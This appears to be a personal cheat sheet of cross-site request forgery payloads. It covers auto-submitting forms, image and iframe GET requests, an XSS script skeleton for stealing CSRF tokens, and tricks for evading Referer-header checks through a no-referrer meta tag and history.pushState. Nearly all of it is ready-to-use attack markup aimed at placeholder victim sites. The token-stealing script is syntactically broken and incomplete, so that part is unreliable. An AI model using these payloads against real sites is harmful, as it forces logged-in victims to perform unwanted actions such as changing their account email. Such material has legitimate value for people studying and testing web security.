# ------------------------------- start CSRF GET ------------------------------- # 
    # --------- CSRF through IMG
        - attacker embbded img with src value contain the vulnerable function and desire values that needed to be insterted, victim will browse malicious page
        and image cause request to the end-point that CSRF vulnerable.

        # --------- exploit:  
            <img src="http://victim.site/dirs/endpoints.php?parm=value&parm2=value2"> 

    # --------- CSRF through form
        - Auto submit form visited by authenticated user.
        <form method="GET" action="victim.site/vuln-end-point">
            <input type="email" value="desire-value" name="email"/>
        </form>
        <script>
            document.forms[0].submit();
        </script>

    # --------- CSRF through iframe
        <iframe src="http://victim.site/dirs/endpoints.php?parm=value&parm2=value2"></iframe>

# -------------------------------   end CSRF GET ------------------------------- #

# ------------------------------- start CSRF POST ------------------------------- #
    # --------- CSRF through form
        - Auto submit form visited by authenticated user.
        <form method="POST" action="victim.site/vuln-end-point">
            <input type="email" value="desire-value" name="email"/>
        </form>
        <script>
            document.forms[0].submit();
        </script>
# -------------------------------   end CSRF POST ------------------------------- #




# ------------------------------- start XSS leads to CSRF ------------------------------- #
    # --------- attack scenario:
        - using xss vulnerability to perform request to target end-point and analysis the response to extract CSRF-token
        after that you move to the next step, craft the CSRF request with CSRF-token. 

        # --------- exploit code:
        <script>
            function csrfstealer(){
                var xhttp;
                if (window.XMLHttpRequest) {
                    xhttp   = new XMLHttpRequest();
                } else {
                    xhttp   = ActiveXObject('Microsoft.XMLHTTP');
                }
                xhttp.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        var entire_content = xhttp.responseText;
                        
                    }
                }
            };
            xhttp.onload = doit;
            xhttp.open("method","vulnerable.site/path", true);
            xhttp.send();
            function doit(){
                // CSRF request
                
            }
            })();
        </script>
                
# -------------------------------   end XSS leads to CSRF ------------------------------- #

# ------------------------------- start Referer header ------------------------------- #
    # --------- Send a CSRF request with no referer header 
        <meta name="referrer" content="no-referrer">

    # --------- Add custom value after your original referer.
        <form method="POST" action="victim.site/vuln-end-point">
                <input type="email" value="desire-value" name="email"/>
        </form>
        <script>
            history.pushState("", "", "/?vuln-domain.com")
            document.forms[0].submit();
        </script>

        # --------- Note:
            - In some case, browser remove the additional value of referer header, you have to add this header on your custom server.
                Referrer-Policy: unsafe-url
# -------------------------------   end Referer header ------------------------------- #